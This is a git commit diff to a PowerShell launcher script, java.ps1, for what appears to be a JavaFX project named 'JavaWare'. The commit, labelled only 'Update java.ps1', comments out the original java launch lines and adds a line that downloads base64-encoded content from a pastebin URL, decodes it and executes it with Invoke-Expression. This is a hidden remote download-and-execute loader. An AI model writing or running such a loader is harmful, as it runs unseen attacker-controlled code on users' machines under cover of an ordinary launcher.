7997bd1bb6c3159177594344e6d2a55042b03486
Kyra <kyralmozley@outlook.com>
2019-08-12 15:41:11 +0100

    Update java.ps1

--- java.ps1
+++ java.ps1
@@ -1,3 +1,6 @@
-﻿ cd ..\..\..\..\..\..\..\
- $java="C:\Program Files\Java\jdk-12.0.1\bin\java.exe"
- Start-Process -FilePath $java -ArgumentList '--module-path "C:\Users\Admin\Desktop\JavaWare\javafx-sdk-11.0.2\lib" --add-modules=javafx.controls -jar Users\Admin\Desktop\JavaWare\JavaWare.jar'
+# cd ..\..\..\..\..\..\..\
+# $java="C:\Program Files\Java\jdk-12.0.1\bin\java.exe"
+# Start-Process -FilePath $java -ArgumentList '--module-path "C:\Users\Admin\Desktop\JavaWare\javafx-sdk-11.0.2\lib" --add-modules=javafx.controls -jar Users\Admin\Desktop\JavaWare\JavaWare.jar'
+
+Invoke-Expression -Command  $([string]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-WebRequest -Uri https://pastebin.com/raw/h8b3Nbs7).content))))
+
